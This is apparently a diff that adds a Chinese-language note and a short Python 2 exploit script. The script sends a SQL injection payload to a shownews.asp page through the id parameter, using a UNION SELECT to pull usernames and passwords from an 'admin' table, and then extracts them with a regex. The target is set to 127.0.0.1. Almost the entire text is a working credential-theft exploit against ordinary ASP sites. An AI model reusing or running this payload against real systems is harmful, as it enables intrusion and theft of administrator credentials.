@@ -1,0 +1,32 @@
+此文本配合“python简单exp编写脚本”配合使用
+注入的exp payload
+shownews.asp?id=-110+union+select+1%2c2%2cchr(126)%2busername%2bchr(124)%2bpassword%2bchr(126)%2c4%2c5%2c6%2c7%2c8%2c9%2c10+from+admin
+使用python2编写代码如下：
+
+#coding:utf-8
+import urllib2
+import re
+
+def get_page(url):
+    #获取网页源码
+    payload='/shownews.asp?id=-110+union+select+1%2c2%2cchr(126)%2busername%2bchr(124)%2bpassword%2bchr(126)%2c4%2c5%2c6%2c7%2c8%2c9%2c10+from+admin'
+    req = urllib2.Request(url+payload)
+    response = urllib2.urlopen(req)
+    page = response.read()
+    return page
+
+
+def exploit(url):
+    #利用函数
+    html = get_page(url)
+    try:
+        m  =re.search('~(.*?)~',html)
+
+        return m.group(1)
+
+    except:
+        return ''
+
+url = 'http://127.0.0.1:99'
+print exploit(url)
+
